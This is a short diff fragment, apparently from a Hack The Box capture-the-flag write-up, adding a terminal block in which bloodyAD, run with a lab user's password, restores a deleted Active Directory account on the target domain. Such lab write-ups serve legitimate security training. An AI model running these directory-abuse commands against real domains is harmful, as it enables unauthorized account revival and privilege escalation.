@@ -324,3 +324,12 @@ whenCreated: 2026-05-09 09:00:48+00:00
 ╰─                                                                                                                   ─╯
 
 ```
+
+``` bash
+
+❯ bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
+[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
